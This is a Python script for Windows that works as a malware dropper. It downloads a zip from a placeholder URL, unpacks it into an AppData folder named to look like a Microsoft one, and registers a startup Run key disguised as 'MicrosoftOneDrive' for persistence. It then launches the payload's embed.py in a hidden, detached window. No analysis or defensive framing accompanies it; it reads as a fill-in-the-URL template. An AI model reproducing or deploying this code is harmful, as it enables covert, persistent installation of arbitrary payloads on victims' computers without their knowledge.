import os
import getpass
from zipfile import ZipFile
import subprocess
import sys
import winreg
try:
    import requests
except ImportError:
    print("installing dependencies....")
    subprocess.run([sys.executable, "-m", "pip", "-q", "install", "requests", "--disable-pip-version-check"], shell=True, check=True)
    import requests
try:
    import winshell
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "-q", "install", "pywin32", "--disable-pip-version-check"], shell=True, check=True)
    subprocess.run([sys.executable, "-m", "pip", "-q", "install", "winshell", "--disable-pip-version-check"], shell=True, check=True)
    subprocess.run([sys.executable, "-m", "pip", "-q", "install", "pypiwin32", "--disable-pip-version-check"], shell=True, check=True)
    import winshell

user = getpass.getuser()

def main():
    url = "YOUR_ZIP_DOWNLOAD_URL"
    r = requests.get(url)
    with open(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime.zip", "wb") as f:
        f.write(r.content)
    with ZipFile(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime.zip", "r") as f:
        f.extractall(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime")
    os.remove(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime.zip")
    with winshell.shortcut(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime\runcut.lnk") as shortcut:
        shortcut.path = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime\run.vbs"
    runkey = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
    winreg.SetValueEx(runkey, "MicrosoftOneDrive", 0, winreg.REG_SZ, fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime\runcut.lnk")
    runkey.Close()
    os.chdir(fr"C:\Users\{user}\AppData\Roaming\Microsoft\Network\runtime")
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    subprocess.Popen([sys.executable, "embed.py"],
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    shell=False,
                    start_new_session=True)

main()
